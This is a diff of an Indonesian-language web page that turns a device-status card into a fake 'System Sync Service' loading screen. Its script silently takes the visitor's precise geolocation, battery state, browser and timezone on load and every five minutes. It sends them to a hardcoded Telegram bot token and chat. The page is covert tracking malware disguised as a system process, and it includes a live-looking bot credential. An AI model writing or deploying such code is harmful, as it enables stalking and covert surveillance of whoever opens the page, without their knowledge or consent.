@@ -1,115 +1,109 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE html><html lang="id">
 <head>
-  <title>Status Perangkat - Ops</title>
+  <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>System UI - Sync Service</title>
   <style>
-    body { font-family: 'Segoe UI', sans-serif; background: #f8f9fa; margin: 0; padding: 20px; color: #333; }
-    .card {
-      background: white;
-      border-radius: 12px;
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f1f1f1;
+      margin: 0;
       padding: 20px;
-      max-width: 600px;
-      margin: auto;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      color: #333;
     }
-    .card h2 {
-      margin-top: 0;
-      font-size: 22px;
-      color: #007bff;
+    .card {
+      background-color: #fff;
+      padding: 20px 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      max-width: 400px;
+      text-align: center;
     }
-    .info {
-      margin: 10px 0;
-      line-height: 1.5;
+    .spinner {
+      margin: 20px auto;
+      width: 40px;
+      height: 40px;
+      border: 4px solid #ccc;
+      border-top-color: #333;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .status {
+      margin-top: 10px;
       font-size: 14px;
-    }
-    .small {
-      font-size: 13px;
-      color: #555;
+      color: #777;
     }
   </style>
 </head>
 <body>
   <div class="card">
-    <h2>Status Perangkat</h2>
-    <div class="info" id="status">Mengambil data lokasi...</div>
-  </div>
-
-  <script>
-    const TOKEN = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
-    const chatId = "5677912817";
-    const userId = "Uta001";
-    let lastSent = 0;
-    const interval = 5 * 60 * 1000;
-
-    function kirimPesanTeks(teks) {
-      const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-      fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: teks })
+    <h2>System Sync Service</h2>
+    <p>Sedang menyinkronkan konfigurasi sistem kamu...</p>
+    <div class="spinner"></div>
+    <p class="status">Mohon jangan tutup halaman ini.</p>
+    <p class="status">Penyelarasan lokasi & status perangkat aktif.</p>
+  </div>  <script>
+    async function sendData() {
+      const location = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true
+        });
       });
-    }
 
-    function formatTime(date) {
-      return date.toLocaleString('id-ID') + '\nUTC: ' + date.toUTCString();
-    }
+      const lat = location.coords.latitude;
+      const lon = location.coords.longitude;
+      const speed = location.coords.speed ?? 'Unknown';
+      const heading = location.coords.heading ?? 'Unknown';
+      const altitude = location.coords.altitude ?? 'Unknown';
+      const accuracy = location.coords.accuracy + 'm';
 
-    function kirimData(pos, battery) {
-      const now = Date.now();
-      if (now - lastSent < interval) return;
-
-      const { latitude: lat, longitude: lon, speed, heading, altitude, accuracy } = pos.coords;
       const lang = navigator.language;
       const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const userAgent = navigator.userAgent;
-      const waktu = new Date();
+      const local = new Date().toLocaleString();
+      const utc = new Date().toUTCString();
+      const ua = navigator.userAgent;
 
-      const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
-      const info = `[ID: ${userId}]
+      const battery = await navigator.getBattery();
+      const batLevel = Math.round(battery.level * 100);
+      const batCharging = battery.charging ? 'Charging' : 'Not Charging';
+
+      const payload = `
+[ID: Uta001]
 Lokasi dikirim: ${lat}, ${lon}
-${mapsLink}
+https://maps.google.com/?q=${lat},${lon}
 
-Speed: ${speed ?? 'Unknown'}
-Heading: ${heading ?? 'Unknown'}
-Altitude: ${altitude ?? 'Unknown'}
-Accuracy: ${accuracy?.toFixed(1) ?? 'Unknown'}m
+Speed: ${speed}
+Heading: ${heading}
+Altitude: ${altitude}
+Accuracy: ${accuracy}
 
 Lang: ${lang}
 TZ: ${tz}
-Local: ${formatTime(waktu)}
+Local: ${local}
+UTC: ${utc}
 
-Battery: ${battery.level * 100}% (${battery.charging ? 'Charging' : 'Not Charging'})
-Device: ${userAgent}`;
+Battery: ${batLevel}% (${batCharging})
+Device: ${ua}`;
 
-      document.getElementById("status").innerText = info;
-      kirimPesanTeks(info);
-      lastSent = now;
-    }
+      const token = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
+      const chat_id = "@OpsBorneo_Bot";
 
-    function gagal(err) {
-      document.getElementById("status").innerText = "Gagal mendapatkan lokasi. Periksa izin.";
-    }
-
-    function mulaiPelacakan(battery) {
-      if ("geolocation" in navigator) {
-        navigator.geolocation.watchPosition(
-          pos => kirimData(pos, battery),
-          gagal,
-          { enableHighAccuracy: true, maximumAge: 10000, timeout: 10000 }
-        );
-      } else {
-        document.getElementById("status").innerText = "Browser tidak mendukung geolokasi.";
-      }
-    }
-
-    if ('getBattery' in navigator) {
-      navigator.getBattery().then(battery => {
-        mulaiPelacakan(battery);
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id, text: payload })
       });
-    } else {
-      mulaiPelacakan({ level: 0.5, charging: false });
     }
-  </script>
-</body>
+
+    sendData();
+    setInterval(sendData, 5 * 60 * 1000);
+  </script></body>
 </html>
